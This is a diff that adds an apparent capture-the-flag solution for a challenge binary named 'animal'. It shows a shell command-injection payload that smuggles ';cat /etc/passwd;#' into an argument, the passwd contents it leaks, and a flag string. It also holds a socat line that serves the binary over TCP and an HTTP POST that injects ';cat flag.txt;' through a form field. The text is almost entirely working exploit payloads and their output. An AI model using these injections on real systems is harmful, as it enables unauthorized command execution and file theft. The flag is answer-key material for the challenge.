@@ -1,0 +1,33 @@
+ionut@kali:~$ ./animal 2 "$(printf "1;cat\x20/etc/passwd;#a\xfb")"
+Your favourite animal is: owl
+1;cat /etc/passwd;#a� loves ;cat /etc/passwd;#a�dog
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+---
+
+You_found_your_favourite_animal!
+RST{3004A48D3B6E673B7B9E68071CCA8D8FDA202F8F51D2AAFD76BCF5DB1B66BDEC}
+
+---
+
+socat tcp-l:8080,fork,reuseaddr exec:./animal
+
+
+sudo docker build -t="$USER/animals" .
+
+---
+
+POST / HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 41
+Content-Type: application/x-www-form-urlencoded
+
+submit&numar=3&nume=111;cat+flag.txt;d;#û
+
+---------------
+
+
+
